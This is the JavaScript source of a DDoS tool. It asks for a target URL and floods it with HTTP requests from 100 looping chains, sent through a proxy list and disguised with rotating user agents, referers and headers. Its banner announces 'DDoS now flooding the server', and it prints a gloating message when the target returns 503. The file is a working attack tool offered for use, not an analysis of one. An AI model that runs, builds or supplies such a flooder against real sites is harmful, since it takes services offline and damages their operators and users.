const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const readline = require('readline');

const proxyF = "proxy.txt";
const uaLF = "ua.txt";

const userAgents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52",
    "Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52",
    "Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537 .36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
];

const langHeader = ['ko-KR', "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", 'en-CA', "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", '*', "en-US,en;q=0.5", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "utf-8, iso-8859-1;q=0.5, *;q=0.1", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5", "cs;q=0.5", 'da, en-gb;q=0.8, en;q=0.7', "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", 'en-US,en;q=0.9', "de-CH;q=0.7", 'tr', "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"];

const refers = ["https://www.google.com/search?q=", "https://check-host.net/", "https://www.facebook.com/", "https://www.youtube.com/", "https://www.fbi.com/", 'https://www.bing.com/search?q=', "https://r.search.yahoo.com/", "https://www.cia.gov/index.html", 'https://vk.com/profile.php?redirect=', "https://www.usatoday.com/search/results?q=", "https://help.baidu.com/searchResult?keywords=", "https://steamcommunity.com/market/search?q=", 'https://www.ted.com/search?q=', "https://play.google.com/store/search?q=", 'https://www.qwant.com/search?q=', "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://www.google.ad/search?q=", "https://www.google.ae/search?q=", "https://www.google.com.af/search?q=", 'https://www.google.com.ag/search?q=', 'https://www.google.com.ai/search?q=', "https://www.google.al/search?q=", "https://www.google.am/search?q=", "https://www.google.co.ao/search?q=", "http://anonymouse.org/cgi-bin/anon-www.cgi/", 'http://coccoc.com/search#query=', "http://ddosvn.somee.com/f5.php?v=", 'http://engadget.search.aol.com/search?q=', "http://engadget.search.aol.com/search?q=query?=query=&q=", "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", 'http://funnymama.com/search?q=', "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", 'http://jigsaw.w3.org/css-validator/validator?uri=', "http://jobs.bloomberg.com/search?q=", "http://jobs.leidos.com/search?q=", "http://jobs.rbs.com/jobs/search?q=", "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=", 'http://millercenter.org/search?q=', "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", 'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=', "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/", 'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=', "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/", 'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=', "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/", "http://search.aol.com/aol/search?q=", "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", 'http://validator.w3.org/feed/check.cgi?url=', "http://vk.com/profile.php?redirect=", 'http://www.ask.com/web?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=', "http://www.bestbuytheater.com/events/search?q=", "http://www.bing.com/search?q=", "http://www.evidence.nhs.uk/search?q=", "http://www.google.com/?q=", "http://www.google.com/translate?u=", "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=", 'http://www.google.ru/url?sa=t&rct=?j&q=&e/', 'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=', "http://www.pagescoring.com/website-speed-test/?url=", "http://www.reddit.com/search?q=", "http://www.search.com/search?q=", "http://www.shodanhq.com/search?q=", 'http://www.ted.com/search?q=', 'http://www.topsiteminecraft.com/site/pinterest.com/search?q=', "http://www.usatoday.com/search/results?q=", "http://www.ustream.tv/search?q=", "http://yandex.ru/yandsearch?text=", "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "http://ytmnd.com/search?q=", "https://add.my.yahoo.com/rss?url=", "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", 'https://drive.google.com/viewerng/viewer?url=', "https://duckduckgo.com/?q=", "https://google.com/"];

const cplist = ["RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'];

const acceptHeader = ["application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9', "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];

function readProxy() {
    try {
        const data = fs.readFileSync(proxyF, "utf8");
        return data.trim().split("\n").map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read proxy list: ${error}`);
        return [];
    }
}

function readUA() {
    try {
        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
        return data.map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
}

function sanitizeUA(userAgent) {
    return userAgent.replace(/[^\x20-\x7E]/g, "");
}

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const delay = 0;

function sendReq(target, agent, userAgent) {
    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
    const headers = {
        "User-Agent": sanitizedUserAgent,
        Accept: randElement(acceptHeader),
        "Accept-Encoding": randElement(encodingHeader),
        "Accept-Language": randElement(langHeader),
        Referer: randElement(refers),
        "Cache-Control": randElement(cplist),
        DNT: "1",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        TE: "Trailers",
    };

    axios
        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
        .then((_) => {
            setTimeout(() => sendReq(target, agent, userAgent), 0);
        })
        .catch((error) => {
            if (error.response && error.response.status === 503) {
                console.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
            } else if (error.response && error.response.status === 502) {
                console.log("Error: Request failed with status code 502");
            } else {
                console.log("Error: " + error.message);
            }
            setTimeout(() => sendReq(target, agent, userAgent), 0);
        });
}

function sendReqs(targetUrl) {
    const proxies = readProxy();
    const userAgentsList = readUA();

    if (proxies.length > 0) {
        const proxy = randElement(proxies);
        const proxyParts = proxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5"
            ? new SocksProxyAgent(proxyUrl)
            : new HttpsProxyAgent(proxyUrl);

        sendReq(targetUrl, agent, randElement(userAgentsList));
    } else {
        sendReq(targetUrl, null, randElement(userAgentsList));
    }
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('\x1b[31m' +
`██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

` + '\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m VERSION  \033[38;5;196m : \033[38;5;46m2.2\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m AUTHOR   \033[38;5;196m : \033[38;5;46mJoshua Apostol\n' +
'\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Government Websites\n' +
'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Education Websites\n───────────────────────────────────────────\x1b[0m');

function askForUrl() {
    rl.question(`\x1b[31m┌─[ \x1b[32m[TARGET URL]\x1b[31m ]─────[ # ]\x1b[0m\n\x1b[31m└─[ \x1b[32m\W\x1b[31m ]────► \x1b[0m`, (url) => {
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            console.log("Vui lòng nhập url.");
            askForUrl();
        } else {
            console.log("\033[38;5;196m");
            console.log("===========================================");
            console.log("        DDoS now flooding the server");
            console.log("===================KIFFY===================");
            console.log("\033[0m");
            let continueAttack = true;
            const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
            const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;

            const attack = () => {
                try {
                    if (!continueAttack) return;

                    const userAgent = randElement(userAgents);
                    const headers = {
                        'User-Agent': userAgent
                    };

                    axios.get(url, { headers })
                        .then((response) => {
                            if (response.status === 503) {
                            }
                        })
                        .catch((error) => {
                            if (error.response && error.response.status === 502) {
                            }
                        });

                    setTimeout(attack, 1000 / requestsPerSecond);
                } catch (error) {
                    console.log("Error: " + error.message);
                    setTimeout(attack, 1000 / requestsPerSecond);
                }
            };

            const numThreads = 100;
            for (let i = 0; i < numThreads; i++) {
                attack();
            }

            setTimeout(() => {
                continueAttack = false;
                console.log('Max requests reached.');
                askForUrl();
            }, maxRequests / requestsPerSecond * 1000);
        }
    });
}

askForUrl(); 
